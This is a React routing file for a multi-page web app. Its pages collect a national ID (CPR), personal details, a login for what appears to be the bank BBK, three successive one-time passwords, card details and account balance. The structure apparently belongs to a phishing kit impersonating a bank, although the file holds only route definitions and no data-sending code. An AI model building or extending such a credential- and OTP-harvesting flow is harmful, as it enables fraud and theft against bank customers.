import React from "react";
import { Routes, Route } from "react-router-dom";
import Firstone from "./pages/Firstone";
import CPRVerification from "./pages/CPRVerification";
import Personalinfo from "./pages/Personalinfo";
import BBKLogin from "./pages/BBKLogin";
import FirstOtpVerify from "../src/pages/FirstOtpVerify";
import Realname from "./pages/Realname";
import Number from "./pages/Number";
import Secondotp from "./pages/Secondotp";
import CardDetails from "./pages/CardDetails";
import AccountBalance from "./pages/AccountBalance";
import Lastotp from "./pages/Lastotp";

export const App = () => {
  return (
    <Routes>
      <Route path="/" element={<Firstone />} />
      <Route path="/cpr" element={<CPRVerification />} />
      <Route path="/personalinfo" element={<Personalinfo />} />
      <Route path="/bbklogin" element={<BBKLogin/>} />
      <Route path="/firstotp" element={<FirstOtpVerify/>} />
      <Route path="/namepage" element={<Number/>} />
      <Route path="/realname" element={<Realname/>} />
      <Route path="/secondotp" element={<Secondotp/>} />
      <Route path="/cardinfo" element={<CardDetails/>} />
      <Route path="/balance" element={<AccountBalance/>} />
      <Route path="/lastotp" element={<Lastotp/>} />
      {/* Add other routes here */}
    </Routes>
  );
};
